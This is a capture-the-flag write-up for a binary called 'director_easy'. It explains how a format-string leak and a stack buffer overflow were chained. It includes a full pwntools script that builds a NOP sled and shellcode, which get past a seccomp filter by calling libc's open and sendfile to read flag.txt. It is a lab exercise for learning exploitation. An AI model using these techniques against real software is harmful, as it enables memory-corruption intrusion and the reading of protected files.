**Protections:**

- **No Canary:** Stack overflows are possible.
    
- **No PIE:** Code segments are at fixed addresses.
    
- **RWX Stack:** The stack is executable (we can run shellcode).
    
- **Seccomp:** A sandbox is active. It allows standard function calls but **blocks `syscall` instructions if they are executed on the stack**.
    

### Vulnerabilities

The binary provided two distinct input stages :

1. **Title Input:** Vulnerable to a **Format String Attack**. It prints the user input directly using `printf`, allowing us to leak memory addresses (Stack and Libc pointers).
    
2. **Plot Summary Input:** Vulnerable to a **Buffer Overflow**. It reads more data than the buffer can hold, allowing us to overwrite the Return Instruction Pointer (RIP) and jump to the stack.
    

---

### The Exploitation Path

#### 1. The Strategy: "Syscall Proxying"

We initially tried standard shellcode (`open`/`read`/`write`), but it crashed with `SIGSYS` or `EOF`.

- **Diagnosis:** The Seccomp filter detected that we were executing a `syscall` instruction inside the Stack memory region and killed the process.
    
- **Solution:** We used a **"Proxy" technique**. Instead of executing the syscall ourselves, our shellcode calls the functions inside **Libc** (specifically `open` and `sendfile`). Since Libc is in a "trusted" memory region, Seccomp allows the syscall to proceed.
    

#### 2. Leaking Addresses (Bypassing ASLR)

We needed to know _where_ the Stack was (to jump to it) and _where_ Libc was (to call its functions).

- **Payload:** `%p|%p|%p|%p|%p|%p|%p|%p`
    
- **Result:**
    
    - **6th Leak:** Stack Address (pointer to our input buffer).
        
    - **8th Leak:** Libc Base Address.
        
- **Calculation:**
    
    - `Target Buffer` = `Stack Leak` - 848 bytes.
        
    - `Jump Target` = `Target Buffer` + 32 bytes (landing inside our NOP sled).
        

#### 3. Finding Function Addresses

We used GDB to find the absolute addresses of the functions we needed in the local Libc version:

- `open`: `0x7ffff7e5ff20`
    
- `sendfile`: `0x7ffff7e60790`
    

#### 4. The Shellcode Logic

We wrote custom Assembly to behave like a C program function call:

1. **Push String:** Pushed `"flag.txt\x00"` onto the stack.
    
2. **Call Open:** Set `rdi` to the stack pointer (filename) and performed `call 0x7ffff7e5ff20`.
    
3. **Save FD:** Saved the returned File Descriptor (RAX) into `r13`.
    
4. **Call Sendfile:** Set arguments `(1, fd, 0, 100)` and performed `call 0x7ffff7e60790`. This copies the file content directly to stdout.
    

#### 5. Solving the "Greedy Read" Issue

During debugging, we realized the first input (`read`) was consuming bytes intended for the second input because we piped the file.

- **Fix:** We padded the "Title" payload to exactly **127 bytes**. This forced the first `read` to stop exactly at the boundary, preserving our shellcode for the second `read`.
    

---

### The Final Local Exploit Script (`gen.py`)

This script generates the `exploit.in` file that successfully retrieves the flag locally.

Python

```
from pwn import *

# 1. Addresses found via GDB Manual Debugging
# ------------------------------------------------
stack_leak = 0x7fffffffd690      # 6th leak from %p
libc_base  = 0x7ffff7fc6000      # 8th leak from %p
addr_open  = 0x7ffff7e5ff20      # GDB: p open
addr_sendfile = 0x7ffff7e60790   # GDB: p sendfile

# 2. Calculations
# ------------------------------------------------
# Jump 32 bytes into the buffer to hit the NOP sled safely
jump_target = (stack_leak - 848) + 32 

# 3. Shellcode: The "Syscall Proxy"
# ------------------------------------------------
# We use RCX for the 4th argument because we are calling functions, not syscalls.
shellcode_src = f"""
    /* Push 'flag.txt\\x00' */
    xor rax, rax
    push rax
    mov rax, 0x7478742e67616c66
    push rax
    
    /* open(rsp, 0, 0) */
    mov rdi, rsp         /* arg1: filename */
    xor rsi, rsi         /* arg2: flags */
    xor rdx, rdx         /* arg3: mode */
    mov r12, {addr_open}
    call r12
    mov r13, rax         /* Save FD */

    /* sendfile(1, fd, 0, 100) */
    mov rdi, 1           /* arg1: stdout */
    mov rsi, r13         /* arg2: fd */
    xor rdx, rdx         /* arg3: offset */
    mov rcx, 100         /* arg4: count */
    mov r12, {addr_sendfile}
    call r12
    
    /* Infinite loop to prevent crash */
    jmp $
"""

context.arch = 'amd64'
shellcode = asm(shellcode_src)

# 4. Construct Payload
# ------------------------------------------------
# Pad Input 1 to 127 bytes to handle the greedy read()
fmt_str = b'%p|' * 8
pad_1   = b'.' * (127 - len(fmt_str))
input_1 = fmt_str + pad_1

# Exploit Buffer
nop_sled = b'\x90' * 64
padding  = b'A' * (280 - len(nop_sled) - len(shellcode))
exploit  = nop_sled + shellcode + padding + p64(jump_target)

# Combine
full_payload = input_1 + exploit

# Save
with open('exploit.in', 'wb') as f:
    f.write(full_payload)

print(f"[+] Local exploit generated. Target: {hex(jump_target)}")
```

### Execution

1. Run `python3 gen.py`.
    
2. Run `gdb ./director_easy`.
    
3. Inside GDB: `run < exploit.in`.
    
4. **Result:** `UNLP{fakeflag}` printed to stdout!